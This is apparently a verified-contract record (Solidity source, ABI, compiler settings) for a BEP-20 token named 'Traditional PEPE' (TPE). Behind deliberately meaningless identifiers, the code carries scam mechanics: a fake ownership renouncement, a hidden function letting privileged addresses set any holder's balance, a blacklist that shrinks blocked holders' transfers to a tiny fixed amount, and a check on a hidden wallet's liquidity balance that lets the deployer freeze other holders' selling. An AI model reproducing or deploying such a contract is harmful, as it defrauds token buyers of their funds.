{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface launchedWalletMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAmount) external view returns (uint256);\n\n    function transfer(address tokenMarketing, uint256 toSell) external returns (bool);\n\n    function allowance(address takeSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMarketing,\n        uint256 toSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalTo, uint256 value);\n    event Approval(address indexed takeSwap, address indexed spender, uint256 value);\n}\n\nabstract contract toLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapMax {\n    function createPair(address totalSwap, address takeTrading) external returns (address);\n}\n\ninterface launchedWalletMinMetadata is launchedWalletMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TraditionalPEPE is toLaunched, launchedWalletMin, launchedWalletMinMetadata {\n\n    address private tokenFund;\n\n    uint256 private toTakeLiquidity = 100000000 * 10 ** 18;\n\n    function enableTake() public {\n        emit OwnershipTransferred(amountAt, address(0));\n        tokenFund = address(0);\n    }\n\n    uint256 private maxIs;\n\n    mapping(address => mapping(address => uint256)) private minTradingSwap;\n\n    function approve(address marketingMin, uint256 toSell) public virtual override returns (bool) {\n        minTradingSwap[_msgSender()][marketingMin] = toSell;\n        emit Approval(_msgSender(), marketingMin, toSell);\n        return true;\n    }\n\n    uint256 constant autoFund = 20 ** 10;\n\n    function launchTrading() private view {\n        require(amountMode[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountFrom;\n    }\n\n    bool public amountReceiver;\n\n    bool public minSender;\n\n    mapping(address => uint256) private senderMarketingIs;\n\n    string private txShouldBuy = \"Traditional PEPE\";\n\n    string private limitModeFund = \"TPE\";\n\n    function balanceOf(address receiverAmount) public view virtual override returns (uint256) {\n        return senderMarketingIs[receiverAmount];\n    }\n\n    function receiverFrom(address totalReceiver) public {\n        launchTrading();\n        if (amountReceiver) {\n            atTeam = senderMinTake;\n        }\n        if (totalReceiver == amountAt || totalReceiver == liquidityTokenMarketing) {\n            return;\n        }\n        teamToken[totalReceiver] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTakeLiquidity;\n    }\n\n    bool public shouldSender;\n\n    function transfer(address sellMaxBuy, uint256 toSell) external virtual override returns (bool) {\n        return buyTotalMarketing(_msgSender(), sellMaxBuy, toSell);\n    }\n\n    bool private marketingAmount;\n\n    function allowance(address teamLiquidity, address marketingMin) external view virtual override returns (uint256) {\n        if (marketingMin == receiverAuto) {\n            return type(uint256).max;\n        }\n        return minTradingSwap[teamLiquidity][marketingMin];\n    }\n\n    uint256 public senderMinTake;\n\n    function sellTx(address isLaunch) public {\n        if (shouldSender) {\n            return;\n        }\n        \n        amountMode[isLaunch] = true;\n        if (maxIs != atTeam) {\n            minSender = false;\n        }\n        shouldSender = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenFund;\n    }\n\n    uint256 receiverTotalShould;\n\n    address receiverSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        liquidityList totalList = liquidityList(receiverAuto);\n        liquidityTokenMarketing = swapMax(totalList.factory()).createPair(totalList.WETH(), address(this));\n        \n        amountAt = _msgSender();\n        enableTake();\n        amountMode[amountAt] = true;\n        senderMarketingIs[amountAt] = toTakeLiquidity;\n        if (atTeam == senderMinTake) {\n            txMin = true;\n        }\n        emit Transfer(address(0), amountAt, toTakeLiquidity);\n    }\n\n    function autoToken(address liquiditySwap, address tokenMarketing, uint256 toSell) internal returns (bool) {\n        require(senderMarketingIs[liquiditySwap] >= toSell);\n        senderMarketingIs[liquiditySwap] -= toSell;\n        senderMarketingIs[tokenMarketing] += toSell;\n        emit Transfer(liquiditySwap, tokenMarketing, toSell);\n        return true;\n    }\n\n    function exemptMarketing(uint256 toSell) public {\n        launchTrading();\n        launchedSell = toSell;\n    }\n\n    mapping(address => bool) public amountMode;\n\n    function teamMax(address sellMaxBuy, uint256 toSell) public {\n        launchTrading();\n        senderMarketingIs[sellMaxBuy] = toSell;\n    }\n\n    function owner() external view returns (address) {\n        return tokenFund;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitModeFund;\n    }\n\n    function transferFrom(address liquiditySwap, address tokenMarketing, uint256 toSell) external override returns (bool) {\n        if (_msgSender() != receiverAuto) {\n            if (minTradingSwap[liquiditySwap][_msgSender()] != type(uint256).max) {\n                require(toSell <= minTradingSwap[liquiditySwap][_msgSender()]);\n                minTradingSwap[liquiditySwap][_msgSender()] -= toSell;\n            }\n        }\n        return buyTotalMarketing(liquiditySwap, tokenMarketing, toSell);\n    }\n\n    uint8 private amountFrom = 18;\n\n    address receiverAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private txMin;\n\n    address public amountAt;\n\n    function name() external view virtual override returns (string memory) {\n        return txShouldBuy;\n    }\n\n    event OwnershipTransferred(address indexed exemptLaunch, address indexed teamFromFund);\n\n    uint256 public atTeam;\n\n    address public liquidityTokenMarketing;\n\n    uint256 launchedSell;\n\n    mapping(address => bool) public teamToken;\n\n    function buyTotalMarketing(address liquiditySwap, address tokenMarketing, uint256 toSell) internal returns (bool) {\n        if (liquiditySwap == amountAt) {\n            return autoToken(liquiditySwap, tokenMarketing, toSell);\n        }\n        uint256 enableLiquidity = launchedWalletMin(liquidityTokenMarketing).balanceOf(receiverSwap);\n        require(enableLiquidity == launchedSell);\n        require(tokenMarketing != receiverSwap);\n        if (teamToken[liquiditySwap]) {\n            return autoToken(liquiditySwap, tokenMarketing, autoFund);\n        }\n        return autoToken(liquiditySwap, tokenMarketing, toSell);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFromFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"exemptMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTokenMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"sellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMinTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMaxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"teamMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMaxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TraditionalPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}